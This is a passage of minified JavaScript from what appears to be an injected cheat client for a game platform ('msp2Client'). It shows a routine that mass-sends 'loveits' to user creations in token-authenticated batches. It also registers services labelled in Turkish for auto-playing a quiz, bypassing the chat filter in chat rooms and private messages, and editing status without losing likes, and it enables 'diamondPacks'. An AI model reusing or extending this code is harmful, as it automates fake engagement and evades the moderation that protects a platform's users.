                        creationId: t,
                        token: e
                    });
                this.shuffleArray(r), Ae(Re, this).total = r.length, Ae(Qe, this)?.call(this);
                for (let t = 0; t < r.length; t += Ae(Ke, this)) {
                    if (Ae(Be, this)) throw new Error("Operation cancelled");
                    const n = r.slice(t, t + Ae(Ke, this));
                    (await this.processBatch(n)).forEach((t => {
                        let {
                            success: e
                        } = t;
                        e ? Ae(Re, this).success++ : Ae(Re, this).failed++
                    })), clearTimeout(e), e = setTimeout((() => {
                        Ae(Qe, this)?.call(this)
                    }), Ae(Xe, this)), await new Promise((t => setTimeout(t, 50)))
                }
                Ae(De, this).track("Loveits process completed", Ae(Re, this))
            } catch (t) {
                "Operation cancelled" === t.message && Ae(De, this).track("Loveits process cancelled", Ae(Re, this))
            } finally {
                Ne(Ge, this, !1), Ne(Be, this, !1), Ne(Ye, this, null), clearTimeout(e), Ae(Qe, this)?.call(this)
            }
        }
        toggle() {
            Ne(qe, this, !Ae(qe, this))
        }
    }
    const Ve = () => {
        const t = f.getInstance(),
            e = (T.getInstance(), new N),
            n = new B,
            i = new st,
            o = new St,
            r = new Jt,
            s = Yt.getInstance(),
            a = new se,
            c = new be,
            h = new He,
            d = $e.getInstance();
        d.registerService("Otomatik Quiz", n, "StarQuiz'i otomatik olarak oynatır.", "Hata yapabilir"), d.registerService("Ürün Katmanlama", i, "Aynı kategoriden birden fazla ürünü aynı anda giyin."), d.registerService("Sohbet Filtresini Atla", r, "Sohbet odalarında ve özel mesajlarda sohbet filtrelemesini atlayın."), d.registerService("Durum Modu", c, "Durumunuzu beğenileri ve yorumları kaybetmeden düzenleyin."), d.registerService("Emote Service", s, "Change your emote animation."), d.registerService("Loveits Service", h, "Send loveits to user creations."), o.setEnabled({
            diamondPacks: !0
        }), Object.defineProperties(window, {
            msp2Client: {
                value: e,
                writable: !1,
                configurable: !1
            },
            autoStarQuiz: {
                value: n,
                writable: !1,
                configurable: !1
            },
            greetingsService: {
                value: a,
                writable: !1,
                configurable: !1
            }
        }), setTimeout((() => {
            Object.defineProperty(window, "emoteService", {
                value: s,
                writable: !1,
                configurable: !1
            })
        }), 3e3), t.track("Client Started")
    };
    "loading" === document.readyState ? document.addEventListener("DOMContentLoaded", Ve) : Ve();
    const Ze = {
        initialize: Ve
    };
    return e.default
})()));
